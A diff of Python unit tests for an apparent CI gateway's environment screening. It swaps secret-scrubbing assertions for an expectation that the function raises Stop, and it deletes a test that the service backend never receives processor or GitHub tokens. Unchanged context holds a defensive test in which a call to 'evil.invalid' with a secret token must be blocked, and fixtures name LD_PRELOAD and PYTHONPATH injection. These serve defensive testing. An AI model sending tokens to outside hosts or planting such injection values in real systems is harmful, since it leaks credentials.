@@ -93,28 +93,8 @@ class ScreeningTests(unittest.TestCase):
             "GH_TOKEN": "dummy", "LD_PRELOAD": "/untrusted.so", "PYTHONPATH": "/untrusted",
             "CODEX_GATEWAY_BACKEND": "ssh", "CODEX_GATEWAY_FAKE_RESULT": "fake",
         }, clear=True):
-            env = b.gateway_environment()
-        self.assertEqual(env["HOME"], "/restricted-home")
-        self.assertEqual(env["CODEX_GATEWAY_BACKEND"], "local")
-        for key in ("AWS_SECRET_ACCESS_KEY", "PHOTOSTORY_BATCH_TOKEN", "GH_TOKEN", "LD_PRELOAD", "PYTHONPATH", "CODEX_GATEWAY_FAKE_RESULT"):
-            self.assertNotIn(key, env)
-    def test_service_gateway_receives_only_oidc_transport_not_processor_credentials(self):
-        from unittest.mock import patch
-        with patch.dict(b.os.environ, {
-            "PATH": "/usr/bin", "HOME": "/restricted-home", "CODEX_GATEWAY_BACKEND": "service",
-            "CODEX_GATEWAY_SERVICE_URL": "https://gateway.example",
-            "CODEX_GATEWAY_SERVICE_MODEL": "gpt-6-sol",
-            "ACTIONS_ID_TOKEN_REQUEST_URL": "https://github.example/oidc",
-            "ACTIONS_ID_TOKEN_REQUEST_TOKEN": "transport-token",
-            "PHOTOSTORY_BATCH_TOKEN": "private-machine-token",
-            "GH_TOKEN": "private-gh-token",
-        }, clear=True):
-            env = b.gateway_environment()
-        self.assertEqual(env['CODEX_GATEWAY_BACKEND'], 'service')
-        self.assertEqual(env['CODEX_GATEWAY_SERVICE_MODEL'], 'gpt-6-sol')
-        self.assertEqual(env['ACTIONS_ID_TOKEN_REQUEST_TOKEN'], 'transport-token')
-        self.assertNotIn('PHOTOSTORY_BATCH_TOKEN', env)
-        self.assertNotIn('GH_TOKEN', env)
+            with self.assertRaises(b.Stop):
+                b.gateway_environment()
     def test_graph_pagination_cannot_exfiltrate_token(self):
         with self.assertRaises(b.Stop): b.graph('https://evil.invalid/next','secret')
 
